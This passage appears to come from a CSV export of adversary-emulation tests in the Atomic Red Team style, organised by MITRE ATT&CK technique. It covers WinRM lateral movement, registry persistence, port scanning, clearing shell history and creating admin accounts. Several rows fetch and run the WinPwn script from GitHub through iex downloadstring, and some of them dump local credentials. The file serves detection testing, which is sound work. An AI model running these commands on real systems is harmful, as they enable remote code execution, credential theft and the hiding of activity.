",powershell,True,,,,,
T1021.006,Remote Services: Windows Remote Management,Remote Code Execution with PS Credentials Using Invoke-Command,5295bd61-bd7e-4744-9d52-85962a4cf2d6,"Simulate lateral movement with PowerShell Remoting on the local host. 
Upon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the 
local machine as remote target.
",windows,,,"Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",powershell,,,Disable-PSRemoting -Force,,,
T1021.006,Remote Services: Windows Remote Management,WinRM Access with Evil-WinRM,efe86d95-44c4-4509-ae42-7bfd9d1f5b3d,An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled,windows,,,evil-winrm -i #{destination_address} -u #{user_name} -p #{password},powershell,True,,,powershell,"dependencies.0.description: Computer must have Ruby Installed
dependencies.0.prereq_command: try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest  -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
$file1= ""PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe""
Start-Process $file1 /S;
dependencies.1.description: Computer must have Evil-WinRM installed
dependencies.1.prereq_command: try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit 1}
dependencies.1.get_prereq_command: gem install evil-winrm
","input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: Domain\Administrator

input_arguments.destination_address.description: Remote Host IP or Hostname

input_arguments.destination_address.type: string

input_arguments.destination_address.default: Target

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

"
T1070.005,Indicator Removal on Host: Network Share Connection Removal,Add Network Share,14c38f32-6509-46d8-ab43-d53e32d2b131,"Add a Network Share utilizing the command_prompt
",windows,,,"net use c: #{share_name}
net share test=#{share_name} /REMARK:""test share"" /CACHE:No
",command_prompt,,,,,,"input_arguments.share_name.description: Share to add.

input_arguments.share_name.type: string

input_arguments.share_name.default: \\test\share

"
T1070.005,Indicator Removal on Host: Network Share Connection Removal,Remove Network Share,09210ad5-1ef2-4077-9ad3-7351e13e9222,"Removes a Network Share utilizing the command_prompt
",windows,,,"net share #{share_name} /delete
",command_prompt,,,,,,"input_arguments.share_name.description: Share to remove.

input_arguments.share_name.type: string

input_arguments.share_name.default: \\test\share

"
T1070.005,Indicator Removal on Host: Network Share Connection Removal,Remove Network Share PowerShell,0512d214-9512-4d22-bde7-f37e058259b3,"Removes a Network Share utilizing PowerShell
",windows,,,"Remove-SmbShare -Name #{share_name}
Remove-FileShare -Name #{share_name}
",powershell,,,,,,"input_arguments.share_name.description: Share to remove.

input_arguments.share_name.type: string

input_arguments.share_name.default: \\test\share

"
T1070.005,Indicator Removal on Host: Network Share Connection Removal,Disable Administrative Share Creation at Startup,99c657aa-ebeb-4179-a665-69288fdd12b8,"Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators 
remote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been
purposefully disabled as is done in this Atomic test. As Microsoft puts it, ""Missing administrative shares typically 
indicate that the computer in question has been compromised by malicious software.""
https://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /f
reg delete ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /f
",,,
T1070.005,Indicator Removal on Host: Network Share Connection Removal,Remove Administrative Shares,4299eff5-90f1-4446-b2f3-7f4f5cfd5d62,"Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators 
remote access to every disk volume on a network-connected system. As Microsoft puts it, “Missing administrative shares typically 
indicate that the computer in question has been compromised by malicious software.
https://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/
",windows,,,for %i in (C$ IPC$ ADMIN$) do net share %i /delete,command_prompt,True,,"net share ADMIN$ /UNLIMITED >nul 2>&1
net share C$=C:\ >nul 2>&1
net share IPC$ >nul 2>&1
",,,
T1619,Cloud Storage Object Discovery,AWS S3 Enumeration,3c7094f8-71ec-4917-aeb8-a633d7ec4ef5,"This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. 
",iaas:aws,,,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done
",sh,False,,,,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS default profile using: aws configure

",
T1546,Event Triggered Execution,Persistence with Custom AutodialDLL,aca9ae16-7425-4b6d-8c30-cad306fdbd5b,"The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. 

The sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.
[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)
",windows,,,"Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
",powershell,True,,Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll,,"dependencies.0.description: AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll

dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1546\bin\"" -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll"" -OutFile ""PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll""

",
T1546,Event Triggered Execution,HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),a574dafe-a903-4cce-9701-14040f4f3532,"An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",windows,,,"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""",powershell,True,,"Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -ErrorAction Ignore",,,"input_arguments.command.description: Command to Execute

input_arguments.command.type: string

input_arguments.command.default: notepad.exe

"
T1546,Event Triggered Execution,HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),36b8dbf9-59b1-4e9b-a3bb-36e80563ef01,"An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",windows,,,"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -ErrorAction Ignore",,,"input_arguments.command.description: Command to Execute

input_arguments.command.type: string

input_arguments.command.default: notepad.exe

"
T1546,Event Triggered Execution,WMI Invoke-CimMethod Start Process,adae83d3-0df6-45e7-b2c3-575f91584577,"The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.
This is a novel way to perform lateral movement or to start a remote process.
This does require WinRM to be enabled. The account performing the run will also need to be elevated.
A successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.
",windows,,,"# Set the remote computer name and credentials
 $RemoteComputer = ""#{dest}""
 $PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = ""#{process}""

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host ""Process started successfully with Process ID: $($Result.ProcessId)""
 } else {
     Write-Host ""Failed to start the process. Error code: $($Result.ReturnValue)""
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession 
",powershell,True,,,,,"input_arguments.dest.description: destination computer name

input_arguments.dest.type: string

input_arguments.dest.default: localhost

input_arguments.password.description: password for account

input_arguments.password.type: string

input_arguments.password.default: P@ssword1

input_arguments.username.description: account to use

input_arguments.username.type: string

input_arguments.username.default: Administrator

input_arguments.process.description: process to spawn

input_arguments.process.type: string

input_arguments.process.default: calc.exe

"
T1046,Network Service Discovery,Port Scan,68e907da-2539-48f6-9fc9-257a78c05540,"Scan ports to check for listening ports.

Upon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.
",linux,macos,,"for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
",bash,,,,,,"input_arguments.host.description: Host to scan.

input_arguments.host.type: string

input_arguments.host.default: 192.168.1.1

"
T1046,Network Service Discovery,Port Scan Nmap,515942b0-a09f-4163-a7bb-22fefb6f185f,"Scan ports to check for listening ports with Nmap.
Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
",linux,macos,,"sudo nmap -sS #{network_range} -p #{port}
telnet #{host} #{port}
nc -nv #{host} #{port}
",sh,True,,,sh,"dependencies.0.description: Check if nmap command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v nmap)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)

dependencies.1.description: Check if nc command exists on the machine

dependencies.1.prereq_command: if [ -x ""$(command -v nc)"" ]; then exit 0; else exit 1; fi;

dependencies.1.get_prereq_command: (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)

dependencies.2.description: Check if telnet command exists on the machine

dependencies.2.prereq_command: if [ -x ""$(command -v telnet)"" ]; then exit 0; else exit 1; fi;

dependencies.2.get_prereq_command: (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)

","input_arguments.host.description: Host to scan.

input_arguments.host.type: string

input_arguments.host.default: 192.168.1.1

input_arguments.port.description: Ports to scan.

input_arguments.port.type: string

input_arguments.port.default: 80

input_arguments.network_range.description: Network Range to Scan.

input_arguments.network_range.type: string

input_arguments.network_range.default: 192.168.1.0/24

"
T1046,Network Service Discovery,Port Scan NMap for Windows,d696a3cb-d7a8-4976-8eb5-5af4abf2e3df,Scan ports to check for listening ports for the local host 127.0.0.1,windows,,,nmap #{host_to_scan},powershell,True,,,powershell,"dependencies.0.description: NMap must be installed

dependencies.0.prereq_command: if (cmd /c ""nmap 2>nul"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nmap-7.80-setup.exe"" #{nmap_url}
Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\nmap-7.80-setup.exe"" /S

","input_arguments.nmap_url.description: NMap installer download URL

input_arguments.nmap_url.type: url

input_arguments.nmap_url.default: https://nmap.org/dist/nmap-7.80-setup.exe

input_arguments.host_to_scan.description: The host to scan with NMap

input_arguments.host_to_scan.type: string

input_arguments.host_to_scan.default: 127.0.0.1

"
T1046,Network Service Discovery,Port Scan using python,6ca45b04-9f15-4424-b9d3-84a217285a5c,"Scan ports to check for listening ports with python
",windows,,,"python ""#{filename}"" -i #{host_ip}
",powershell,,,,powershell,"dependencies.0.description: Check if python exists on the machine

dependencies.0.prereq_command: if (python --version) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: echo ""Python 3 must be installed manually""

","input_arguments.host_ip.description: Host to scan.

input_arguments.host_ip.type: string

input_arguments.host_ip.default: 127.0.0.1

input_arguments.filename.description: Location of the project file

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1046\src\T1046.py

"
T1046,Network Service Discovery,WinPwn - spoolvulnscan,54574908-f1de-4356-9021-8053dd57439a,Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
spoolvulnscan -noninteractive -consoleoutput",powershell,,,,,,
T1046,Network Service Discovery,WinPwn - MS17-10,97585b04-5be2-40e9-8c31-82157b8af2d6,Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
MS17-10 -noninteractive -consoleoutput",powershell,,,,,,
T1046,Network Service Discovery,WinPwn - bluekeep,1cca5640-32a9-46e6-b8e0-fabbe2384a73,Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput",powershell,,,,,,
T1046,Network Service Discovery,WinPwn - fruit,bb037826-cbe8-4a41-93ea-b94059d6bb98,Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
fruit -noninteractive -consoleoutput",powershell,,,,,,
T1046,Network Service Discovery,Network Service Discovery for Containers,06eaafdb-8982-426e-8a31-d572da633caa,"Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",containers,,,"docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/
docker run --name t1046_container  -d -t t1046
docker exec t1046_container ./test.sh",sh,,,"docker stop t1046_container
docker rmi -f t1046",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker  --no-pager

dependencies.1.get_prereq_command: sudo systemctl start docker

",
T1046,Network Service Discovery,Port-Scanning /24 Subnet with PowerShell,05df2a79-dba6-4088-a804-9ca0802ca8e4,"Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's ""primary"" IPv4 address first and then scans that address with a /24 netmask.
The connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.
",windows,,,"$ipAddr = ""#{ip_address}""
if ($ipAddr -eq """") {
    # Assumes the ""primary"" interface is shown at the top
    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
    Write-Host ""[i] Using Interface $interface""
    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
}
Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
# Always assumes /24 subnet
Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""

$ports = #{port_list}
$subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }

foreach ($ip in $subnetIPs) {
    foreach ($port in $ports) {
      try {
          $tcp = New-Object Net.Sockets.TcpClient
          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
      } catch {}
      if ($tcp.Connected) {
          $tcp.Close()
          Write-Host ""Port $port is open on $ip""
      }
    }
}
",powershell,,,,,,"input_arguments.ip_address.description: IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine.

input_arguments.ip_address.type: string

input_arguments.ip_address.default: 

input_arguments.port_list.description: Comma separated list of ports to scan

input_arguments.port_list.type: string

input_arguments.port_list.default: 445, 3389

input_arguments.timeout_ms.description: Connection timeout in milliseconds

input_arguments.timeout_ms.type: string

input_arguments.timeout_ms.default: 200

"
T1006,Direct Volume Access,Read volume boot sector via DOS device path (PowerShell),88f6327e-51ec-4bbf-b2e8-3fea534eab8b,"This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
On success, a hex dump of the first 11 bytes of the volume is displayed.

For a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
```",windows,,,"$buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream ""\\.\#{volume}"", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer
",powershell,True,,,,,"input_arguments.volume.description: Drive letter of the volume to access

input_arguments.volume.type: string

input_arguments.volume.default: C:

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (rm),a934276e-2be5-4a36-93fd-98adbb5bd4fc,"Clears bash history via rm
",linux,macos,,"rm #{history_path}
",sh,,,,,,"input_arguments.history_path.description: Bash history path

input_arguments.history_path.type: path

input_arguments.history_path.default: ~/.bash_history

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (echo),cbf506a5-dd78-43e5-be7e-a46b7c7a0a11,"Clears bash history via echo
",linux,,,"echo """" > #{history_path}
",sh,,,,,,"input_arguments.history_path.description: Bash history path

input_arguments.history_path.type: path

input_arguments.history_path.default: ~/.bash_history

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (cat dev/null),b1251c35-dcd3-4ea1-86da-36d27b54f31f,"Clears bash history via cat /dev/null
",linux,macos,,"cat /dev/null > #{history_path}
",sh,,,,,,"input_arguments.history_path.description: Bash history path

input_arguments.history_path.type: path

input_arguments.history_path.default: ~/.bash_history

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (ln dev/null),23d348f3-cc5c-4ba9-bd0a-ae09069f0914,"Clears bash history via a symlink to /dev/null
",linux,macos,,"ln -sf /dev/null #{history_path}
",sh,,,,,,"input_arguments.history_path.description: Bash history path

input_arguments.history_path.type: path

input_arguments.history_path.default: ~/.bash_history

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (truncate),47966a1d-df4f-4078-af65-db6d9aa20739,"Clears bash history via truncate
",linux,,,"truncate -s0 #{history_path}
",sh,,,,,,"input_arguments.history_path.description: Bash history path

input_arguments.history_path.type: path

input_arguments.history_path.default: ~/.bash_history

"
T1070.003,Indicator Removal on Host: Clear Command History,Clear history of a bunch of shells,7e6721df-5f08-4370-9255-f06d8a77af4c,"Clears the history of a bunch of different shell types by setting the history size to zero
",linux,macos,,"unset HISTFILE
export HISTFILESIZE=0
history -c
",sh,,,,,,
T1070.003,Indicator Removal on Host: Clear Command History,Clear and Disable Bash History Logging,784e4011-bd1a-4ecd-a63a-8feb278512e6,"Clears the history and disable bash history logging of the current shell and future shell sessions
",linux,macos,,"set +o history
echo 'set +o history' >> ~/.bashrc
. ~/.bashrc
history -c
",sh,,,"sed -i 's/set +o history//g' ~/.bashrc
. ~/.bashrc
set -o history
",,,
T1070.003,Indicator Removal on Host: Clear Command History,Use Space Before Command to Avoid Logging to History,53b03a54-4529-4992-852d-a00b4b7215a6,"Using a space before a command causes the command to not be logged in the Bash History file
",linux,macos,,"hostname
whoami
",sh,,,,,,
T1070.003,Indicator Removal on Host: Clear Command History,Disable Bash History Logging with SSH -T,5f8abd62-f615-43c5-b6be-f780f25790a1,"Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog
",linux,,,"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
",sh,,,"[ ""$(uname)"" = 'FreeBSD' ] && rmuser -y testuser1 || userdel -f testuser1
",,"dependencies.0.description: Install sshpass and create user account used for excuting

dependencies.0.prereq_command: $(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)

dependencies.0.get_prereq_command: [ ""$(uname)"" = 'FreeBSD' ] && pw useradd testuser1 -g wheel -s /bin/sh || /usr/sbin/useradd testuser1
[ ""$(uname)"" = 'FreeBSD' ] && echo 'pwd101!' | pw mod user testuser1 -h 0 || echo -e 'pwd101!\npwd101!' | passwd testuser1
(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)||(which pkg && pkg install -y sshpass)

",
T1070.003,Indicator Removal on Host: Clear Command History,Prevent Powershell History Logging,2f898b81-3e97-4abb-bc3f-a95138988370,"Prevents Powershell history
",windows,,,"Set-PSReadlineOption -HistorySaveStyle SaveNothing
",powershell,,,Set-PSReadLineOption -HistorySaveStyle SaveIncrementally,,,
T1070.003,Indicator Removal on Host: Clear Command History,Clear Powershell History by Deleting History File,da75ae8d-26d6-4483-b0fe-700e4df4f037,"Clears Powershell history
",windows,,,"Remove-Item (Get-PSReadlineOption).HistorySavePath
",powershell,,,,,,
T1070.003,Indicator Removal on Host: Clear Command History,Set Custom AddToHistoryHandler to Avoid History File Logging,1d0d9aa6-6111-4f89-927b-53e8afae7f94,"The ""AddToHistoryHandler"" receives the current command as the $line variable and then returns $true if 
the line should be written to the history file. Here we simply return $false so nothing gets added to 
the history file for the current session. 
",windows,,,"Set-PSReadLineOption -AddToHistoryHandler { return $false }
",powershell,,,"Set-PSReadLineOption -AddToHistoryHandler $null
",,,
T1078.003,Valid Accounts: Local Accounts,Create local account with admin privileges,a524ce99-86de-4db6-b4f9-e08f35a47a15,After execution the new account will be active and added to the Administrators group,windows,,,"net user art-test /add
net user art-test #{password}
net localgroup administrators art-test /add",command_prompt,True,,"net localgroup administrators art-test /delete >nul 2>&1
net user art-test /delete >nul 2>&1",,,"input_arguments.password.description: Password for art-test user

input_arguments.password.type: string

input_arguments.password.default: -4RTisCool!-321

"
T1078.003,Valid Accounts: Local Accounts,Create local account with admin privileges - MacOS,f1275566-1c26-4b66-83e3-7f9f7f964daa,After execution the new account will be active and added to the Administrators group,macos,,,"dscl . -create /Users/AtomicUser
dscl . -create /Users/AtomicUser UserShell /bin/bash
dscl . -create /Users/AtomicUser RealName ""Atomic User""
dscl . -create /Users/AtomicUser UniqueID 503
dscl . -create /Users/AtomicUser PrimaryGroupID 503
dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
dscl . -passwd /Users/AtomicUser mySecretPassword
dscl . -append /Groups/admin GroupMembership AtomicUser",bash,True,,sudo dscl . -delete /Users/AtomicUser,,,
T1078.003,Valid Accounts: Local Accounts,Create local account with admin privileges using sysadminctl utility - MacOS,191db57d-091a-47d5-99f3-97fde53de505,After execution the new account will be active and added to the Administrators group,macos,,,sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin,bash,True,,sysadminctl interactive -deleteUser art-tester,,,
T1078.003,Valid Accounts: Local Accounts,Enable root account using dsenableroot utility - MacOS,20b40ea9-0e17-4155-b8e6-244911a678ac,After execution the current/new user will have root access,macos,,,"dsenableroot #current user
dsenableroot -u art-tester -p art-tester -r art-root #new user",bash,True,,"dsenableroot -d #current user
dsenableroot -d -u art-tester -p art-tester #new user",,,
T1078.003,Valid Accounts: Local Accounts,Add a new/existing user to the admin group using dseditgroup utility - macOS,433842ba-e796-4fd5-a14f-95d3a1970875,After execution the current/new user will be added to the Admin group,macos,,,dseditgroup -o edit -a art-user -t user admin,bash,True,,dseditgroup -o edit -d art-user -t user admin,,,
T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - powerhell kittie,9e9fd066-453d-442f-88c1-ad7911d32912,Loot local Credentials - powerhell kittie technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
obfuskittiedump -consoleoutput -noninteractive",powershell,True,,,,,
T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - Safetykatz,e9fdb899-a980-4ba4-934b-486ad22e22f4,Loot local Credentials - Safetykatz technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive",powershell,True,,,,,
T1078.003,Valid Accounts: Local Accounts,Create local account (Linux),02a91c34-8a5b-4bed-87af-501103eb5357,"An adversary may wish to create an account with admin privileges to work with. In this test we create a ""art"" user with the password art, switch to art, execute whoami, exit and delete the art user.
",linux,,,"password=$(openssl passwd -1 art)
([ ""$(uname)"" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
su art -c ""whoami; exit""
",bash,True,,"[ ""$(uname)"" = 'Linux' ] && userdel art -rf || rmuser -y art
",,,
T1078.003,Valid Accounts: Local Accounts,Reactivate a locked/expired account (Linux),d2b95631-62d7-45a3-aaef-0972cea97931,"A system administrator may have locked and expired a user account rather than deleting it. ""the user is coming back, at some stage"" An adversary may reactivate a inactive account in an attempt to appear legitimate. 

In this test we create a ""art"" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.
",linux,,,"useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
usermod --lock art
usermod --expiredate ""1"" art
usermod --unlock art
usermod --expiredate ""99999"" art
su art
whoami
exit
",bash,True,,"userdel -r art 
",,,
T1078.003,Valid Accounts: Local Accounts,Reactivate a locked/expired account (FreeBSD),09e3380a-fae5-4255-8b19-9950be0252cf,"A system administrator may have locked and expired a user account rather than deleting it. ""the user is coming back, at some stage"" An adversary may reactivate a inactive account in an attempt to appear legitimate. 

In this test we create a ""art"" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.
",linux,,,"pw useradd art -g wheel -s /bin/sh
echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
pw lock art
pw usermod art -e +1d
pw unlock art
pw user mod art -e +99d
su art
whoami
exit
",sh,True,,"rmuser -y art 
",,,
T1078.003,Valid Accounts: Local Accounts,Login as nobody (Linux),3d2cd093-ee05-41bd-a802-59ee5c301b85,"An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.
",linux,,,"cat /etc/passwd |grep nobody 
# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
chsh --shell /bin/bash nobody
usermod --password $(openssl passwd -1 nobody) nobody
su nobody
whoami
exit
",bash,True,,"chsh --shell /usr/sbin/nologin nobody
cat /etc/passwd |grep nobody 
